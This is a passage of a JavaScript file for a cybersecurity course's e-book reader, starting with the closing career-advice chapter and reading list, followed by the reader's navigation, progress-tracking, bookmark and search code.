                  <li>Cybersecurity offers diverse career paths: SOC, pentesting, IR, malware analysis, engineering, GRC, bug bounty, CISO.</li>
                  <li>Each path has its own skills, tools, and certifications.</li>
                  <li>Start with fundamentals, then specialize.</li>
                  <li>Certifications validate knowledge; experience and projects demonstrate competence.</li>
                  <li>Build a home lab, practice on platforms, and create a portfolio.</li>
                  <li>Network with professionals, attend meetups, and join communities.</li>
                  <li>Tailor your resume, prepare for interviews, and apply strategically.</li>
                  <li>Follow a structured action plan: immediate, short-term, medium-term, long-term.</li>
                  <li>Continuous learning is essential; threats evolve daily.</li>
                  <li>Ethics and integrity are paramount.</li>
                  <li>The cybersecurity community is welcoming; give back through mentoring and knowledge sharing.</li>
                  <li>Your journey starts now. Stay curious, stay persistent, and never stop learning.</li>
                </ul>

                <p style="text-align: center; font-size: 1.1rem; margin-top: 2rem;"><strong>Congratulations, beta! You have completed the entire Cyber Security Fundamentals course.</strong></p>
                <p style="text-align: center;">You now have a comprehensive understanding of networking, cryptography, malware, attacks, defenses, tools, and career paths. The next step is to apply this knowledge in your home lab, earn certifications, and start your journey as a cybersecurity professional.</p>
                <p style="text-align: center;"><strong>Stay safe, stay ethical, and keep hacking — the right way.</strong></p>
              </section>

              <section class="content-block">
                <h3 class="content-h">10. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://tryhackme.com/" target="_blank" rel="noopener">TryHackMe — Guided labs</a>
                  <a href="https://www.hackthebox.com/" target="_blank" rel="noopener">Hack The Box — CTF and labs</a>
                  <a href="https://portswigger.net/web-security" target="_blank" rel="noopener">PortSwigger Academy — Web security labs</a>
                  <a href="https://blueteamlabs.online/" target="_blank" rel="noopener">Blue Team Labs Online — Defensive labs</a>
                  <a href="https://letsdefend.io/" target="_blank" rel="noopener">LetsDefend — SOC analyst training</a>
                  <a href="https://www.offsec.com/" target="_blank" rel="noopener">OffSec — OSCP and advanced training</a>
                  <a href="https://www.sans.org/" target="_blank" rel="noopener">SANS — Professional training</a>
                  <a href="https://www.hackerone.com/" target="_blank" rel="noopener">HackerOne — Bug bounty</a>
                </div>
              </section>
            ` },
        ],
      },
    ],
  };

  const KEYS = {
    progress: "ck_book_progress_v3",
    current: "ck_book_current_chapter",
    open: "ck_book_open",
    bookmarks: "ck_book_bookmarks_v3",
  };
  const reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
  const flat = BOOK.sections.flatMap((section) => section.chapters.map((chapter) => ({ section, chapter })));
  const state = {
    initialized: false,
    isOpen: false,
    activeSection: "p0",
    activeChapter: "0.1",
    searchTerm: "",
    expanded: new Set(["front", "p0"]),
    soundContext: null,
  };

  function escapeHtml(value) {
    return String(value ?? "")
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#39;");
  }

  function readJson(key, fallback) {
    try {
      const value = JSON.parse(localStorage.getItem(key) || "null");
      return value && typeof value === "object" ? value : fallback;
    } catch (error) {
      return fallback;
    }
  }

  function writeJson(key, value) {
    try { localStorage.setItem(key, JSON.stringify(value)); } catch (error) { /* offline-safe */ }
  }

  function getProgress() { return readJson(KEYS.progress, {}); }
  function getBookmarks() { return readJson(KEYS.bookmarks, {}); }
  function isComplete(id) { return Boolean(getProgress()[id]); }
  function isBookmarked(id) { return Boolean(getBookmarks()[id]); }

  function setCurrent(id) {
    try { localStorage.setItem(KEYS.current, id); } catch (error) { /* offline-safe */ }
  }

  function getCurrent() {
    let id = "0.1";
    try { id = localStorage.getItem(KEYS.current) || id; } catch (error) { /* offline-safe */ }
    return flat.some(({ chapter }) => chapter.id === id) ? id : "0.1";
  }

  function setOpen(value) {
    try { localStorage.setItem(KEYS.open, value ? "true" : "false"); } catch (error) { /* offline-safe */ }
  }

  function savedOpen() {
    try { return localStorage.getItem(KEYS.open) === "true"; } catch (error) { return false; }
  }

  function icon(name, size = 18) {
    const paths = {
      shield: '<path d="M12 3 5 6v5c0 4.5 2.8 7.8 7 10 4.2-2.2 7-5.5 7-10V6l-7-3Z"/><path d="m9 12 2 2 4-4"/>',
      book: '<path d="M4 5.5A2.5 2.5 0 0 1 6.5 3H20v15H6.5A2.5 2.5 0 0 0 4 20.5v-15Z"/><path d="M4 20.5A2.5 2.5 0 0 1 6.5 18H20"/>',
      search: '<circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/>',
      bookmark: '<path d="M6 4.5A1.5 1.5 0 0 1 7.5 3h9A1.5 1.5 0 0 1 18 4.5V21l-6-3.5L6 21V4.5Z"/>',
      check: '<path d="m5 12 4 4L19 6"/>',
      arrowLeft: '<path d="m15 18-6-6 6-6"/><path d="M9 12h10"/>',
      arrowRight: '<path d="m9 18 6-6-6-6"/><path d="M15 12H5"/>',
      chevron: '<path d="m8 10 4 4 4-4"/>',
      close: '<path d="m6 6 12 12M18 6 6 18"/>',
      copy: '<rect x="8" y="8" width="10" height="10" rx="1"/><path d="M6 15H5a1 1 0 0 1-1-1V5a1 1 0 0 1 1-1h9a1 1 0 0 1 1 1v1"/>',
      terminal: '<rect x="3" y="4" width="18" height="16" rx="2"/><path d="m7 9 3 3-3 3M12 15h5"/>',
    };
    return `<svg aria-hidden="true" viewBox="0 0 24 24" width="${size}" height="${size}" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">${paths[name] || paths.book}</svg>`;
  }

  function sectionLabel(section) {
    return section.type === "part" ? `Part ${section.number}` : "Front Matter";
  }

  function findChapter(id) {
    return flat.find(({ chapter }) => chapter.id === id) || flat[0];
  }

  function safeFocus(element) {
    if (element && typeof element.focus === "function") element.focus({ preventScroll: true });
  }

  function ensureEnhancements() {
    const hero = $(".book-hero");
    const outlineWrap = $("#book-outline-wrap");
    const sidebar = $(".book-sidebar");
    if (!hero || !outlineWrap || !sidebar) return;

    if (!$(".book-ambient-particles", hero)) {
      const particles = document.createElement("div");
      particles.className = "book-ambient-particles";
      particles.setAttribute("aria-hidden", "true");
      particles.innerHTML = Array.from({ length: 18 }, (_, index) => `<i style="--i:${index}"></i>`).join("");
      hero.appendChild(particles);
    }

    const book = $("#book-3d");
    if (book && !$(".book-page-spread", book)) {
      const spread = document.createElement("div");
      spread.className = "book-page-spread";
      spread.setAttribute("aria-hidden", "true");
      spread.innerHTML = `<div class="book-page-left"><span class="spread-kicker">CYBER KNIGHTS / FIELD NOTES</span><span class="spread-rule"></span><strong>Learn the system.<br>Defend the boundary.</strong><span class="spread-page-no">01</span></div><div class="book-page-right"><span class="spread-kicker">ACADEMY EDITION · V3.0</span><span class="spread-rule"></span><div class="spread-lines"><i></i><i></i><i></i><i></i></div><span class="spread-stamp">SAFE LAB<br>ONLY</span><span class="spread-page-no">02</span></div>`;
      book.appendChild(spread);
    }

    if (!$("#book-resume-prompt", hero)) {
      const prompt = document.createElement("div");
      prompt.id = "book-resume-prompt";
      prompt.className = "book-resume-prompt hidden";
      hero.insertBefore(prompt, $(".book-progress-wrap", hero));
    }

    if (!$("#book-progress-map", hero)) {
      const map = document.createElement("div");
      map.id = "book-progress-map";
      map.className = "book-progress-map";
      hero.appendChild(map);
    }

    if (!$(".book-sidebar-tools", sidebar)) {
      const tools = document.createElement("div");
      tools.className = "book-sidebar-tools";
      tools.innerHTML = `<label class="book-search-label" for="book-chapter-search">${icon("search", 15)}<span>Find a chapter</span></label><div class="book-search-wrap"><input id="book-chapter-search" class="book-search" type="search" placeholder="Search the handbook" autocomplete="off" /><span id="book-search-count" class="book-search-count"></span></div><button class="book-mobile-outline-close" type="button" aria-label="Close outline">${icon("close", 16)}</button>`;
      sidebar.insertBefore(tools, $("#book-outline-list", sidebar));
    }

    if (!$(".book-mobile-bar", outlineWrap)) {
      const bar = document.createElement("div");
      bar.className = "book-mobile-bar";
      bar.innerHTML = `<button id="book-outline-toggle" class="mini-btn" type="button" aria-expanded="false">${icon("book", 16)}<span>Book Path</span></button><span class="book-mobile-current" id="book-mobile-current">Chapter map</span>`;
      outlineWrap.insertBefore(bar, $(".book-layout", outlineWrap));
    }

    if (!$("#book-live-status")) {
      const live = document.createElement("div");
      live.id = "book-live-status";
      live.className = "sr-only";
      live.setAttribute("role", "status");
      live.setAttribute("aria-live", "polite");
      document.body.appendChild(live);
    }

    $("#btn-start-learning-2")?.setAttribute("aria-label", "Open the Cyber Knights Security Handbook");
    $("#btn-start-learning")?.setAttribute("aria-label", "Start reading the Cyber Knights Security Handbook");
    $("#btn-close-book")?.setAttribute("aria-label", "Close the book reader");
  }

  function updateResumePrompt() {
    const prompt = $("#book-resume-prompt");
    if (!prompt) return;
    const current = getCurrent();
    const done = Object.keys(getProgress()).length;
    const shouldShow = done > 0 || current !== "0.1";
    if (!shouldShow) {
      prompt.classList.add("hidden");
      return;
    }
    const found = findChapter(current);
    prompt.classList.remove("hidden");
    prompt.innerHTML = `<span class="resume-signal">${icon("book", 16)}</span><span><strong>Resume reading</strong><small>${escapeHtml(found.chapter.id)} · ${escapeHtml(found.chapter.title)}</small></span><button type="button" class="mini-btn" id="btn-resume-book">Continue ${icon("arrowRight", 15)}</button>`;
  }

  function updateProgress() {
    const doneIds = getProgress();
    const total = flat.length;
    const done = flat.filter(({ chapter }) => doneIds[chapter.id]).length;
    const percent = total ? Math.round((done / total) * 100) : 0;
    const bar = $("#book-progress-bar");
    const label = $("#book-progress-label");
    if (bar) bar.style.width = `${percent}%`;
    if (label) label.textContent = `${done} / ${total} chapters (${percent}%)`;

    const map = $("#book-progress-map");
    if (map) {
      map.innerHTML = `<span class="progress-map-kicker">PATH COMPLETION</span><div class="progress-map-track">${BOOK.sections.map((section) => `<span class="progress-map-part" style="--part:${Math.max(1, section.chapters.length)}" title="${escapeHtml(section.title)}"><i style="width:${Math.round(section.chapters.filter((chapter) => doneIds[chapter.id]).length / section.chapters.length * 100)}%"></i></span>`).join("")}</div><span class="progress-map-copy">${done ? `${done} chapter${done === 1 ? "" : "s"} cleared. Keep the signal alive.` : "Your path starts with one deliberate chapter."}</span>`;
    }
    updateResumePrompt();
  }

  function filteredChapters() {
    const query = state.searchTerm.trim().toLowerCase();
    if (!query) return flat;
    return flat.filter(({ section, chapter }) => `${section.title} ${chapter.id} ${chapter.title} ${chapter.build || ""}`.toLowerCase().includes(query));
  }

  function renderOutline() {
    const wrap = $("#book-outline-list");
    if (!wrap) return;
    const matches = filteredChapters();
    const matchIds = new Set(matches.map(({ chapter }) => chapter.id));
    const count = $("#book-search-count");
    if (count) count.textContent = state.searchTerm ? `${matches.length} match${matches.length === 1 ? "" : "es"}` : `${flat.length} chapters`;
    wrap.innerHTML = BOOK.sections.map((section) => {
      const sectionMatches = section.chapters.filter((chapter) => matchIds.has(chapter.id));
      if (state.searchTerm && !sectionMatches.length) return "";
      const open = state.searchTerm || state.expanded.has(section.id) || section.chapters.some((chapter) => chapter.id === state.activeChapter);
      const partNo = section.type === "part" ? `Part ${section.number}` : "Front Matter";
      return `<section class="outline-section ${open ? "is-expanded" : ""}" data-section-id="${escapeHtml(section.id)}"><button class="outline-section-toggle" type="button" aria-expanded="${open}" data-section-toggle="${escapeHtml(section.id)}"><span class="outline-section-icon">${icon(section.type === "part" ? "shield" : "book", 16)}</span><span class="outline-section-name"><small>${partNo}</small><strong>${escapeHtml(section.title)}</strong></span><span class="outline-section-count">${section.chapters.length}</span><span class="outline-section-chevron">${icon("chevron", 16)}</span></button><div class="outline-chapters">${section.chapters.filter((chapter) => matchIds.has(chapter.id)).map((chapter) => { const active = chapter.id === state.activeChapter; const complete = isComplete(chapter.id); const marked = isBookmarked(chapter.id); return `<button class="outline-chapter ${active ? "is-active" : ""} ${complete ? "is-complete" : ""}" type="button" data-chapter-id="${escapeHtml(chapter.id)}" aria-current="${active ? "page" : "false"}" title="${escapeHtml(chapter.title)}"><span class="outline-check">${complete ? icon("check", 13) : ""}</span><span class="outline-chapter-copy"><strong>${escapeHtml(chapter.id)}</strong><span>${escapeHtml(chapter.title)}</span></span><span class="outline-page">${escapeHtml(chapter.pages)}</span>${marked ? `<span class="outline-bookmark">${icon("bookmark", 13)}</span>` : ""}</button>`; }).join("")}</div></section>`;
    }).join("") || `<div class="book-empty-state">${icon("search", 20)}<strong>No chapters found</strong><span>Try a broader term like network, defense, or lab.</span></div>`;
    const activeButton = $(".outline-chapter.is-active", wrap);
    activeButton?.scrollIntoView({ block: "nearest" });
    const current = findChapter(state.activeChapter);
    const mobileCurrent = $("#book-mobile-current");
    if (mobileCurrent && current) mobileCurrent.textContent = `${current.chapter.id} · ${current.chapter.title}`;
  }

  function partRemaining(section, chapterId) {
    const index = section.chapters.findIndex((chapter) => chapter.id === chapterId);
    return section.chapters.slice(index < 0 ? 0 : index).reduce((sum, chapter) => sum + (Number(chapter.read) || 0), 0);
  }

    function renderChapter(id, animate = true) {
    const found = findChapter(id);
    if (!found) return;
    const { section, chapter } = found;
    state.activeSection = section.id;
    state.activeChapter = chapter.id;
    setCurrent(chapter.id);
    state.expanded.add(section.id);
    const complete = isComplete(chapter.id);
    const bookmarked = isBookmarked(chapter.id);
    const content = $("#book-content");
    if (!content) return;
    const remaining = partRemaining(section, chapter.id);

    // Default placeholder blocks (used when no content is present yet)
    const placeholderHTML = `
      <div class="chapter-content-intro">
        <div class="chapter-content-icon">${icon("shield", 21)}</div>
        <div>
          <span class="section-eyebrow">READING MODE · ${escapeHtml(sectionLabel(section).toUpperCase())}</span>
          <h3>Build the mental model first.</h3>
          <p>This chapter is being written. The full content will include concepts, examples, pitfalls, and a safe lab move.</p>
        </div>
      </div>
      <div class="placeholder-blocks">
        <div class="placeholder-block"><span class="pb-label">Concepts</span><span class="pb-hint">Core definitions and mental models</span></div>
        <div class="placeholder-block"><span class="pb-label">Examples</span><span class="pb-hint">Real-world scenarios to inspect</span></div>
        <div class="placeholder-block"><span class="pb-label">Pitfalls</span><span class="pb-hint">Common mistakes to avoid</span></div>
        <div class="placeholder-block"><span class="pb-label">Exercises</span><span class="pb-hint">Hands-on practice prompts</span></div>
        <div class="placeholder-block"><span class="pb-label">Diagrams</span><span class="pb-hint">Visual explanations and maps</span></div>
        <div class="placeholder-block"><span class="pb-label">Labs</span><span class="pb-hint">Safe, isolated lab exercises</span></div>
      </div>`;

    // Render actual content if available, else placeholder
    const bodyHTML = chapter.content
      ? `<div class="chapter-content">${chapter.content}</div>`
      : placeholderHTML;

    const body = `
      <article class="chapter-reader" aria-labelledby="chapter-heading">
        <header class="chapter-header">
          <div class="chapter-breadcrumb">
            <span>${escapeHtml(sectionLabel(section))}</span>
            <span class="sep">›</span>
            <span>${escapeHtml(section.title)}</span>
          </div>
          <div class="chapter-heading-row">
            <div>
              <span class="chapter-index">CHAPTER ${escapeHtml(chapter.id)}</span>
              <h2 class="chapter-title" id="chapter-heading">${escapeHtml(chapter.title)}</h2>
            </div>
            <button type="button" class="chapter-bookmark ${bookmarked ? "is-bookmarked" : ""}" id="btn-bookmark" aria-pressed="${bookmarked}" aria-label="${bookmarked ? "Remove chapter bookmark" : "Bookmark chapter"}">
              ${icon("bookmark", 18)}<span>${bookmarked ? "Bookmarked" : "Bookmark"}</span>
            </button>
          </div>
          <div class="chapter-meta">
            <span>${icon("book", 14)} Pages ${escapeHtml(chapter.pages)}</span>
            <span class="dot">·</span>
            <span>${icon("terminal", 14)} ~${escapeHtml(chapter.read)} min read</span>
            <span class="dot">·</span>
            <span class="chapter-time-left">${remaining} min left in this module</span>
            ${complete ? `<span class="chapter-done-badge">${icon("check", 13)} Completed</span>` : ""}
          </div>
        </header>
        ${bodyHTML}
        <footer class="chapter-actions">
          <button class="btn-secondary" type="button" id="btn-prev-chapter" ${flat[0].chapter.id === chapter.id ? "disabled" : ""}>${icon("arrowLeft", 16)} Previous</button>
          <button class="btn-primary ${complete ? "done" : ""}" type="button" id="btn-mark-complete" ${complete ? "disabled" : ""}>${complete ? icon("check", 15) + " Completed" : "Mark as Complete"}</button>
          <button class="btn-secondary" type="button" id="btn-next-chapter" ${flat[flat.length - 1].chapter.id === chapter.id ? "disabled" : ""}>Next ${icon("arrowRight", 16)}</button>
        </footer>
      </article>`;
    content.innerHTML = body;
    const panel = $(".book-content-panel");
    if (panel) panel.scrollTo({ top: 0, behavior: reduceMotion ? "auto" : "smooth" });
    if (animate && !reduceMotion) {
      content.classList.remove("chapter-is-entering");
      requestAnimationFrame(() => content.classList.add("chapter-is-entering"));
      if (window.gsap) window.gsap.fromTo(content, { opacity: 0, y: 14, rotateX: -1 }, { opacity: 1, y: 0, rotateX: 0, duration: 0.4, ease: "power3.out", clearProps: "all" });
    }
    renderOutline();
    updateProgress();
  }

  function navigate(direction) {
    const index = flat.findIndex(({ chapter }) => chapter.id === state.activeChapter);
    const target = flat[index + direction];
    if (!target) return;
    playSound("page");
    renderChapter(target.chapter.id, true);
  }

  function markComplete() {
    const progress = getProgress();
    progress[state.activeChapter] = true;
    writeJson(KEYS.progress, progress);
    playSound("complete");
    renderChapter(state.activeChapter, false);
    $("#book-live-status").textContent = `Chapter ${state.activeChapter} marked complete.`;
    const content = $("#book-content");
    content?.classList.add("completion-pulse");
    setTimeout(() => content?.classList.remove("completion-pulse"), reduceMotion ? 0 : 900);
  }

  function toggleBookmark() {
    const bookmarks = getBookmarks();
    if (bookmarks[state.activeChapter]) delete bookmarks[state.activeChapter];
    else bookmarks[state.activeChapter] = true;
    writeJson(KEYS.bookmarks, bookmarks);
    playSound("click");
    renderChapter(state.activeChapter, false);
  }

  function openBook(chapterId = getCurrent(), immediate = false) {
    if (state.isOpen && !immediate) return;
    ensureEnhancements();
    state.isOpen = true;
    setOpen(true);
    const book = $("#book-3d");
    const hero = $(".book-hero");
    const outline = $("#book-outline-wrap");
    const start = $("#btn-start-learning");
    if (book) { book.classList.add("is-opening"); if (!reduceMotion && window.gsap && !immediate) window.gsap.to(book, { rotateY: 0, duration: 1.4, ease: "power3.inOut" }); }
    hero?.classList.add("book-reader-engaged");
    start?.setAttribute("aria-expanded", "true");
    const reveal = () => {
      book?.classList.add("is-open");
      book?.classList.remove("is-opening");
      outline?.classList.remove("hidden");
      renderOutline();
      renderChapter(chapterId, false);
      outline?.scrollIntoView({ behavior: reduceMotion ? "auto" : "smooth", block: "start" });
      safeFocus($(".outline-chapter.is-active"));
    };
    playSound("open");
    if (immediate || reduceMotion) reveal();
    else window.setTimeout(reveal, 1050);
  }

  function closeBook() {
    if (!state.isOpen) return;
    state.isOpen = false;
    setOpen(false);
    const book = $("#book-3d");
    const hero = $(".book-hero");
    const outline = $("#book-outline-wrap");
    const start = $("#btn-start-learning");
    book?.classList.remove("is-open", "is-opening");
    hero?.classList.remove("book-reader-engaged");
    outline?.classList.add("hidden");
    start?.setAttribute("aria-expanded", "false");
    if (start) start.textContent = "Start Learning →";
    $(".book-content-panel")?.scrollTo({ top: 0, behavior: "auto" });
    $("#btn-start-learning")?.focus({ preventScroll: true });
  }

  function unlockAudio() {
    if (state.soundContext) return state.soundContext;
    try {
      const AudioContext = window.AudioContext || window.webkitAudioContext;
      if (AudioContext) state.soundContext = new AudioContext();
    } catch (error) { state.soundContext = null; }
    return state.soundContext;
  }

  function playSound(kind) {
    const audio = unlockAudio();
    if (!audio) return;
    const oscillator = audio.createOscillator();
    const gain = audio.createGain();
    const now = audio.currentTime;
    oscillator.type = "sine";
    oscillator.frequency.setValueAtTime(kind === "open" ? 180 : kind === "complete" ? 660 : 420, now);
    oscillator.frequency.exponentialRampToValueAtTime(kind === "open" ? 280 : 520, now + 0.12);
    gain.gain.setValueAtTime(0.0001, now);
    gain.gain.exponentialRampToValueAtTime(kind === "complete" ? 0.045 : 0.022, now + 0.015);
    gain.gain.exponentialRampToValueAtTime(0.0001, now + (kind === "open" ? 0.28 : 0.14));
    oscillator.connect(gain).connect(audio.destination);
    oscillator.start(now);
    oscillator.stop(now + (kind === "open" ? 0.3 : 0.16));
  }

  async function copyCode(button) {
    const value = button?.dataset.copyCode || "";
    try {
      await navigator.clipboard.writeText(value);
      button.innerHTML = `${icon("check", 14)} Copied`;
      setTimeout(() => { if (button.isConnected) button.innerHTML = `${icon("copy", 14)} Copy`; }, 1300);
    } catch (error) {
      $("#book-live-status").textContent = "Copy unavailable. Select the code manually.";
    }
  }

  function onClick(event) {
    const target = event.target.closest("button");
    if (!target) return;
    if (target.id === "btn-start-learning" || target.id === "btn-start-learning-2") { unlockAudio(); openBook(); return; }
    if (target.id === "btn-close-book") { closeBook(); return; }
    if (target.id === "btn-resume-book") { openBook(getCurrent()); return; }
    if (target.id === "btn-mark-complete") { markComplete(); return; }
    if (target.id === "btn-prev-chapter") { navigate(-1); return; }
    if (target.id === "btn-next-chapter") { navigate(1); return; }
    if (target.id === "btn-bookmark") { toggleBookmark(); return; }
    if (target.dataset.copyCode) { copyCode(target); return; }
    if (target.dataset.chapterId) { playSound("click"); renderChapter(target.dataset.chapterId); return; }
    if (target.dataset.sectionToggle) {
      const id = target.dataset.sectionToggle;
      state.expanded.has(id) ? state.expanded.delete(id) : state.expanded.add(id);
      renderOutline();
      return;
    }
    if (target.id === "book-outline-toggle") {
      const sidebar = $(".book-sidebar");
      const open = sidebar?.classList.toggle("is-mobile-open");
      target.setAttribute("aria-expanded", String(Boolean(open)));
      return;
    }
    if (target.classList.contains("book-mobile-outline-close")) {
      $(".book-sidebar")?.classList.remove("is-mobile-open");
      $("#book-outline-toggle")?.setAttribute("aria-expanded", "false");
    }
  }

  function onKeydown(event) {
    const tag = event.target?.tagName?.toLowerCase();
    const typing = tag === "input" || tag === "textarea" || event.target?.isContentEditable;
    if (event.key === "Escape" && state.isOpen) { closeBook(); return; }
    if (!state.isOpen || typing) return;
    if (event.key === "ArrowLeft") { event.preventDefault(); navigate(-1); }
    if (event.key === "ArrowRight") { event.preventDefault(); navigate(1); }
    if (event.key === "ArrowDown" || event.key === "ArrowUp") {
      const chapters = $$(".outline-chapter");
      const current = document.activeElement;
      const index = chapters.indexOf(current);
      if (index >= 0) { event.preventDefault(); chapters[(index + (event.key === "ArrowDown" ? 1 : -1) + chapters.length) % chapters.length]?.focus(); }
    }
  }

  function initialize() {
    ensureEnhancements();
    if (state.initialized) { updateProgress(); renderOutline(); return; }
    state.initialized = true;
    $("#btn-start-learning")?.addEventListener("click", onClick);
    $("#btn-start-learning-2")?.addEventListener("click", onClick);
    $("#btn-close-book")?.addEventListener("click", onClick);
    document.addEventListener("click", onClick);
    document.addEventListener("keydown", onKeydown);
    $("#book-chapter-search")?.addEventListener("input", (event) => { state.searchTerm = event.target.value; renderOutline(); });
    updateProgress();
    if (savedOpen()) openBook(getCurrent(), true);
    else renderOutline();
    console.info(`[CK] Books v4 ready — ${flat.length} chapters across ${BOOK.sections.length} parts`);
  }

      window.CKBooks = {
    init: initialize,
    open: () => openBook(getCurrent()),
    close: closeBook,
    getBook: () => BOOK,
  };

  // Expose globally for admin editor + backward compatibility
  window.BOOK = BOOK;
  window.books = BOOK;
  window.CYBER_BOOKS = BOOK;
})();